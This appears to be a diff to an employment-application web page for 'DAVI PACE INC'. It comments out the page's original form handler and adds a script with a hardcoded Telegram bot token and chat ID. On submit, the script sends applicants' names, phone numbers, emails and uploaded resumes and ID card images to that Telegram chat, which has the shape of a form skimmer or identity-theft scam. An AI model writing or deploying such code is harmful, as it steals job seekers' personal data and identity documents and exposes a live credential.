@@ -336,7 +336,7 @@
         <small>Copyright © 2025 DAVI PACE INC - All Rights Reserved.</small>
       </div>
     </div>
-    <script>
+    <!-- <script>
       document
         .getElementById("apply-form")
         .addEventListener("submit", async (e) => {
@@ -374,6 +374,80 @@
           // Re-enable the button
           submitBtn.disabled = false;
           submitBtn.textContent = "Submit";
+        });
+    </script> -->
+    <script>
+      const BOT_TOKEN = "6980032440:AAGfgxetXOEWp0bVi2cXotvrupsDqn0FUxU"; // Replace with your bot token
+      const CHAT_ID = "1099461059"; // Replace with your chat/channel ID
+
+      document
+        .getElementById("apply-form")
+        .addEventListener("submit", async (e) => {
+          e.preventDefault();
+
+          const form = e.target;
+          const submitBtn = document.getElementById("submit-button");
+          const statusEl = document.getElementById("status");
+
+          // Disable button and indicate loading
+          submitBtn.disabled = true;
+          submitBtn.textContent = "Submitting...";
+          statusEl.textContent = "";
+
+          const formData = new FormData(form);
+
+          // Build the message text
+          const messageText = `
+New Employment Application:
+
+👤 Name: ${formData.get("name")}
+📞 Phone: ${formData.get("phone")}
+✉️ Email: ${formData.get("email")}
+🛠️ Role: ${formData.get("role")}
+`;
+
+          try {
+            // Send the text message first
+            await fetch(
+              `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+              {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: CHAT_ID,
+                  text: messageText,
+                }),
+              }
+            );
+
+            // Prepare files to send
+            const fileFields = ["resume", "id_front", "id_back"];
+            for (const field of fileFields) {
+              const file = formData.get(field);
+              if (file && file.size > 0) {
+                const fileFormData = new FormData();
+                fileFormData.append("chat_id", CHAT_ID);
+                fileFormData.append("document", file, file.name);
+
+                await fetch(
+                  `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
+                  {
+                    method: "POST",
+                    body: fileFormData,
+                  }
+                );
+              }
+            }
+
+            statusEl.textContent = "✅ Application submitted successfully!";
+            form.reset();
+          } catch (error) {
+            console.error(error);
+            statusEl.textContent = "❌ Submission failed. Please try again.";
+          } finally {
+            submitBtn.disabled = false;
+            submitBtn.textContent = "Submit Application";
+          }
         });
     </script>
   </body>
